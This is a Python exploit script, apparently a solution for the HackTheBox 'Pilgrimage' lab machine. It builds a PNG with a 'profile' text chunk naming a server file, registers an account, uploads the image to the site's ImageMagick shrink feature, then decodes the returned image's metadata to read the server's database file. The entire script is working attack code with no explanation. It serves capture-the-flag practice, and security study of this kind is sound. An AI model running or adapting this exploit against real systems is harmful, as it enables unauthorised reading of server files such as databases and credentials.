import subprocess
import requests
import os
import re

baseUrl = "http://pilgrimage.htb/"

def checkInstallation():
	for tools in ["pngcrush","imagemagick","libimage-exiftool-perl","exiv2"]:
		checkTools = subprocess.check_output(["dpkg", "-s", tools], text=True)
		print(f"[+] {tools} installed") if "Status: install ok" in checkTools else print(f"[+] {tools} not installed! try sudo apt install {tools}")

def isPngExist():
	checkPng = subprocess.check_output(["ls"], text=True)
	print(f"[+] image/png file exist!") if ".png" in checkPng else print(f"[+] need image/png file in current dir!")

def generatePayload(file, fileImage):
	print("[+] Injecting payload to image!\n")
	generate = subprocess.check_output(["pngcrush", "-text", "a", "profile", f"{file}", f"{fileImage}"], text=True)
	print("\n[+] Check the injected image work perfectly!\n")
	checkPayload = subprocess.check_output(["exiv2", "-pS", "pngout.png"], text=True)
	print(checkPayload)
	
def registerToDashboard(username, password):
	data = {"username":username, "password":password}
	send = requests.post(baseUrl + "register.php", data=data, allow_redirects=True)
	send = send.text
	print(f"[+] Register success and redirect to dashboard!") if f"Logout" in send else print(f"[+] Register Failed! Something happened or user already registered and login!")

def uploadImageDownloading():
	with open("pngout.png", "rb") as file:
		files = {"toConvert":file}
		send = requests.post(baseUrl, files=files, allow_redirects=True)
	imageUrl = send.url.rsplit("=")[1].rsplit("&")[0]
	print(f"\n[+] Upload Image Success: {imageUrl}\n") if "shrunk" in send.url else print(f"[+] Failed to upload image!")
	print(f"[+] Download uploaded image!\n")
	downloading = subprocess.check_output(["wget", imageUrl, "-O", "local-file-read.png"], text=True)
	
def readLocalFileInImage():
	identify = subprocess.check_output(["identify", "-verbose", "local-file-read.png"], text=True).rsplit("  ")[-15]
	split = re.split(r"\b(\d+)\b", identify)[2].replace("\n","")
	try:
		print(bytes.fromhex(split).decode("utf-8"))
	except Exception:
		print("[+] Something happened! Or maybe file not found / permission denied!")
		print(f"\n[+] Check the output below! try echo <output> | xxd -r -p \n {identify}")

checkInstallation()
isPngExist()
generatePayload("/var/db/pilgrimage", "banua.png")
registerToDashboard("banua", "banua")
uploadImageDownloading()
readLocalFileInImage()